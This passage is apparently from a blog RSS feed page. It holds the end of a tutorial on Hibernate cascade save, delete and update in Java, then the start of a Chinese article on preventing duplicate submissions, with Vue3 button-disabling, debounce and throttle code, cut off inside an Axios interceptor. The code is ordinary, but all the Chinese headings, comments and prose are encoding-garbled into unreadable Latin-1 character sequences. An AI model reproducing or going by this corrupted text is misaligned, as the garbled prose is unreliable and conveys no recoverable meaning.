    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-8">çº§è”ä¿å­˜ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeSaveExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥æ•°æ®</span>
        insertPersonWithAddresses(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertPersonWithAddresses</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"123 Street"</span>, person);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"456 Avenue"</span>, person);

            person.addAddress(address1);
            person.addAddress(address2);

            <span class="hljs-comment">// ä¿å­˜Personå¯¹è±¡æ—¶ï¼Œçº§è”ä¿å­˜Addresså¯¹è±¡</span>
            session.save(person);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted Person with Addresses"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-9">çº§è”åˆ é™¤ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeDeleteExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// åˆ é™¤æ•°æ®</span>
        deletePersonWithAddresses(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deletePersonWithAddresses</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–Personå¯¹è±¡</span>
            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> session.get(Person.class, <span class="hljs-number">1L</span>);
            <span class="hljs-keyword">if</span> (person != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// åˆ é™¤Personå¯¹è±¡æ—¶ï¼Œçº§è”åˆ é™¤Addresså¯¹è±¡</span>
                session.delete(person);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Deleted Person with Addresses"</span>);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"No Person found with ID 1"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-10">çº§è”æ›´æ–°ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateCascadeUpdateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ›´æ–°æ•°æ®</span>
        updatePersonWithAddresses(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updatePersonWithAddresses</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–Personå¯¹è±¡</span>
            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> session.get(Person.class, <span class="hljs-number">1L</span>);
            <span class="hljs-keyword">if</span> (person != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// æ›´æ–°Personå¯¹è±¡</span>
                person.setName(<span class="hljs-string">"Jane Doe"</span>);
                person.setAge(<span class="hljs-number">35</span>);

                <span class="hljs-comment">// çº§è”æ›´æ–°Addresså¯¹è±¡</span>
                <span class="hljs-keyword">for</span> (Address address : person.getAddresses()) {
                    address.setStreet(address.getStreet() + <span class="hljs-string">" Updated"</span>);
                }

                session.update(person);
                transaction.commit();
                System.out.println(<span class="hljs-string">"Updated Person with Addresses"</span>);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"No Person found with ID 1"</span>);
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-11">çº§è”æ“ä½œçš„è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></strong>ï¼šå®šä¹‰æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€Hibernateå±æ€§é…ç½®ä»¥åŠå®ä½“ç±»æ˜ å°„é…ç½®ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Person"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Address"</span>/&gt;</span>
</code></pre>
</li>
<li>
<p><strong>å®ä½“ç±» <code>Person</code> å’Œ <code>Address</code></strong>ï¼š</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é«˜å¹¶å‘ä¸‹çš„é˜²å¹¶å‘å®æˆ˜ï¼šCç«¯/Bç«¯é¡¹ç›®å¹¶å‘æ§åˆ¶å®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592164124659679282</link>    <guid>https://juejin.cn/post/7592164124659679282</guid>    <pubDate>2026-01-07T02:22:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592164124659679282" data-draft-id="7592164124659433522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é«˜å¹¶å‘ä¸‹çš„é˜²å¹¶å‘å®æˆ˜ï¼šCç«¯/Bç«¯é¡¹ç›®å¹¶å‘æ§åˆ¶å®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-07T02:22:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¸…æ°”çš„ä½ "/> <meta itemprop="url" content="https://juejin.cn/user/1626932940649534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é«˜å¹¶å‘ä¸‹çš„é˜²å¹¶å‘å®æˆ˜ï¼šCç«¯/Bç«¯é¡¹ç›®å¹¶å‘æ§åˆ¶å®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1626932940649534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¸…æ°”çš„ä½ 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T02:22:04.000Z" title="Wed Jan 07 2026 02:22:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é«˜å¹¶å‘ä¸‹çš„é˜²å¹¶å‘å®æˆ˜ï¼šCç«¯/Bç«¯é¡¹ç›®å¹¶å‘æ§åˆ¶å®Œå…¨æŒ‡å—</h2>
<blockquote>
<p><strong>æ‘˜è¦</strong>ï¼šæœ¬æ–‡ç³»ç»Ÿæ¢³ç†Cç«¯/Bç«¯é¡¹ç›®ä¸­çš„é˜²å¹¶å‘æ–¹æ¡ˆï¼Œæ¶µç›–å‰ç«¯é˜²é‡å¤æäº¤ï¼ˆæŒ‰é’®ç¦ç”¨ã€è¯·æ±‚å»é‡ï¼‰å’Œåç«¯å¹¶å‘æ§åˆ¶ï¼ˆåˆ†å¸ƒå¼é”ã€ä¹è§‚é”ã€æ‚²è§‚é”ã€å¹‚ç­‰æ€§ã€é™æµã€é˜Ÿåˆ—å‰Šå³°ï¼‰ã€‚é€šè¿‡ç§’æ€ã€æ”¯ä»˜ã€æ‰¹é‡å¯¼å…¥ç­‰å®æˆ˜åœºæ™¯ï¼Œæä¾›å®Œæ•´çš„ä»£ç ç¤ºä¾‹å’Œæ–¹æ¡ˆé€‰æ‹©æŒ‡å—ï¼Œé€‚é…SpringBoot 2.xå’ŒVue3æŠ€æœ¯æ ˆã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€å¼•è¨€</h3>
<p>åœ¨äº’è”ç½‘åº”ç”¨ä¸­ï¼Œå¹¶å‘æ§åˆ¶æ˜¯ä¿éšœç³»ç»Ÿç¨³å®šæ€§å’Œæ•°æ®ä¸€è‡´æ€§çš„æ ¸å¿ƒé—®é¢˜ã€‚æ— è®ºæ˜¯Cç«¯ç”¨æˆ·çš„ç§’æ€æŠ¢è´­ã€ä¸‹å•æ”¯ä»˜ï¼Œè¿˜æ˜¯Bç«¯ç³»ç»Ÿçš„æ‰¹é‡æ“ä½œã€æ•°æ®åŒæ­¥ï¼Œéƒ½éœ€è¦æœ‰æ•ˆçš„é˜²å¹¶å‘æœºåˆ¶ã€‚æœ¬æ–‡å°†ä»å‰åç«¯ä¸¤ä¸ªç»´åº¦ï¼Œç³»ç»Ÿæ¢³ç†Cç«¯å’ŒBç«¯é¡¹ç›®ä¸­å¸¸è§çš„é˜²å¹¶å‘æ€è·¯å’Œå®æˆ˜æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-2">1.1 å¹¶å‘é—®é¢˜çš„å…¸å‹åœºæ™¯</h4>
<h5 data-id="heading-3">Cç«¯åœºæ™¯</h5>
<ul>
<li><strong>ç§’æ€æŠ¢è´­</strong>ï¼šåº“å­˜æ‰£å‡ã€è®¢å•åˆ›å»º</li>
<li><strong>æ”¯ä»˜ä¸‹å•</strong>ï¼šé‡å¤æ”¯ä»˜ã€è®¢å•é‡å¤åˆ›å»º</li>
<li><strong>ä¼˜æƒ åˆ¸é¢†å–</strong>ï¼šé‡å¤é¢†å–ã€è¶…å‘</li>
<li><strong>ç­¾åˆ°æ‰“å¡</strong>ï¼šé‡å¤ç­¾åˆ°ã€æ•°æ®é‡å¤</li>
</ul>
<h5 data-id="heading-4">Bç«¯åœºæ™¯</h5>
<ul>
<li><strong>æ‰¹é‡å¯¼å…¥</strong>ï¼šé‡å¤å¯¼å…¥ã€æ•°æ®è¦†ç›–</li>
<li><strong>å®¡æ ¸æµç¨‹</strong>ï¼šé‡å¤å®¡æ ¸ã€çŠ¶æ€å†²çª</li>
<li><strong>æ•°æ®åŒæ­¥</strong>ï¼šé‡å¤åŒæ­¥ã€æ•°æ®ä¸ä¸€è‡´</li>
<li><strong>æŠ¥è¡¨ç”Ÿæˆ</strong>ï¼šé‡å¤ç”Ÿæˆã€èµ„æºæµªè´¹</li>
</ul>
<h4 data-id="heading-5">1.2 å¹¶å‘é—®é¢˜çš„å±å®³</h4>
<ol>
<li><strong>æ•°æ®ä¸ä¸€è‡´</strong>ï¼šåº“å­˜è¶…å–ã€ä½™é¢é”™è¯¯</li>
<li><strong>é‡å¤æ“ä½œ</strong>ï¼šé‡å¤ä¸‹å•ã€é‡å¤æ‰£æ¬¾</li>
<li><strong>èµ„æºæµªè´¹</strong>ï¼šé‡å¤è®¡ç®—ã€é‡å¤è°ƒç”¨</li>
<li><strong>ä¸šåŠ¡å¼‚å¸¸</strong>ï¼šçŠ¶æ€é”™ä¹±ã€æµç¨‹ä¸­æ–­</li>
</ol>
<h3 data-id="heading-6">äºŒã€é˜²å¹¶å‘æ–¹æ¡ˆå…¨æ™¯å›¾</h3>
<h4 data-id="heading-7">2.1 é˜²å¹¶å‘æ–¹æ¡ˆ-æ€ç»´å¯¼å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6411a357edcb4259ba34edf81a1af193~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biF5rCU55qE5L2g:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357323&amp;x-signature=3uXQEZxTxqz6RNCRpHx%2BnboUSNo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">2.2 æ–¹æ¡ˆé€‰æ‹©å†³ç­–æ ‘</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6cdcd3e6da540c68ce8b2196b397a61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biF5rCU55qE5L2g:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357323&amp;x-signature=1vMnN%2FBl0ABX0qTcvB0MJdtGmiU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">ä¸‰ã€å‰ç«¯é˜²å¹¶å‘æ–¹æ¡ˆ</h3>
<h4 data-id="heading-10">3.1 UIå±‚é˜²é‡å¤æäº¤</h4>
<h5 data-id="heading-11">3.1.1 æŒ‰é’®ç¦ç”¨æ–¹æ¡ˆ</h5>
<p><strong>Vue3 å®ç°ï¼ˆComposition APIï¼‰ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-button 
    :loading="submitting" 
    :disabled="submitting"
    @click="handleSubmit"
  &gt;
    {{ submitting ? 'æäº¤ä¸­...' : 'æäº¤è®¢å•' }}
  &lt;/el-button&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'
import { ElMessage } from 'element-plus'

const submitting = ref(false)

const handleSubmit = async () =&gt; {
  // é˜²æ­¢é‡å¤ç‚¹å‡»
  if (submitting.value) {
    return
  }
  
  submitting.value = true
  try {
    await submitOrder()
    ElMessage.success('æäº¤æˆåŠŸ')
  } catch (error) {
    ElMessage.error('æäº¤å¤±è´¥ï¼š' + error.message)
  } finally {
    submitting.value = false
  }
}

const submitOrder = async () =&gt; {
  // è°ƒç”¨åç«¯æ¥å£
  const response = await axios.post('/api/order/submit', orderData)
  return response.data
}
&lt;/script&gt;
</code></pre>
<p><strong>Vue3 å®ç°ï¼ˆOptions APIï¼‰ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-button 
    :loading="submitting" 
    :disabled="submitting"
    @click="handleSubmit"
  &gt;
    æäº¤è®¢å•
  &lt;/el-button&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      submitting: false
    }
  },
  methods: {
    async handleSubmit() {
      if (this.submitting) {
        return
      }
      
      this.submitting = true
      try {
        await this.submitOrder()
        this.$message.success('æäº¤æˆåŠŸ')
      } catch (error) {
        this.$message.error('æäº¤å¤±è´¥ï¼š' + error.message)
      } finally {
        this.submitting = false
      }
    },
    
    async submitOrder() {
      const response = await this.$http.post('/api/order/submit', this.orderData)
      return response.data
    }
  }
}
&lt;/script&gt;
</code></pre>
<h5 data-id="heading-12">3.1.2 é˜²æŠ–ï¼ˆDebounceï¼‰æ–¹æ¡ˆ</h5>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> æœç´¢æ¡†è¾“å…¥ã€æŒ‰é’®å¿«é€Ÿç‚¹å‡»</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;el-input 
    v-model="keyword" 
    @input="handleSearch"
    placeholder="è¯·è¾“å…¥å…³é”®è¯"
  /&gt;
  &lt;el-button @click="handleSubmit"&gt;æäº¤&lt;/el-button&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'
import { debounce } from 'lodash-es'

const keyword = ref('')

// é˜²æŠ–å¤„ç†ï¼š500mså†…åªæ‰§è¡Œæœ€åä¸€æ¬¡
const handleSearch = debounce((value) =&gt; {
  console.log('æœç´¢ï¼š', value)
  // æ‰§è¡Œæœç´¢é€»è¾‘
  searchData(value)
}, 500)

// æŒ‰é’®é˜²æŠ–
let submitTimer = null
const handleSubmit = () =&gt; {
  if (submitTimer) {
    clearTimeout(submitTimer)
  }
  
  submitTimer = setTimeout(() =&gt; {
    submitOrder()
    submitTimer = null
  }, 1000) // 1ç§’å†…åªå…è®¸æäº¤ä¸€æ¬¡
}
&lt;/script&gt;
</code></pre>
<p><strong>è‡ªå®šä¹‰é˜²æŠ–æŒ‡ä»¤ï¼ˆVue3ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// directives/debounce.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>
    el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (timer) {
        <span class="hljs-built_in">clearTimeout</span>(timer)
      }
      timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        binding.<span class="hljs-title function_">value</span>()
      }, binding.<span class="hljs-property">arg</span> || <span class="hljs-number">1000</span>)
    })
  }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
&lt;el-button v-<span class="hljs-attr">debounce</span>:<span class="hljs-number">1000</span>=<span class="hljs-string">"handleSubmit"</span>&gt;æäº¤&lt;/el-button&gt;
</code></pre>
<h5 data-id="heading-13">3.1.3 èŠ‚æµï¼ˆThrottleï¼‰æ–¹æ¡ˆ</h5>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> æ»šåŠ¨åŠ è½½ã€çª—å£resize</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref, onMounted, onUnmounted } from 'vue'
import { throttle } from 'lodash-es'

const handleScroll = throttle(() =&gt; {
  // æ»šåŠ¨å¤„ç†é€»è¾‘
  const scrollTop = document.documentElement.scrollTop
  if (scrollTop &gt; 1000) {
    loadMore()
  }
}, 200) // 200mså†…æœ€å¤šæ‰§è¡Œä¸€æ¬¡

onMounted(() =&gt; {
  window.addEventListener('scroll', handleScroll)
})

onUnmounted(() =&gt; {
  window.removeEventListener('scroll', handleScroll)
})
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-14">3.2 è¯·æ±‚æ‹¦æˆªä¸å»é‡</h4>
<h5 data-id="heading-15">3.2.1 Axios è¯·æ±‚æ‹¦æˆªå™¨</h5>
<p><strong>å®ç°è¯·æ±‚å»é‡ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/request.js</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessage</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'element-plus'</span>

<span class="hljs-comment">// å­˜å‚¨æ­£åœ¨è¿›è¡Œçš„è¯·æ±‚</span>
<span class="hljs-keyword">const</span> pendingRequests = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()

<span class="hljs-comment">// ç”Ÿæˆè¯·æ±‚å”¯ä¸€æ ‡è¯†</span>
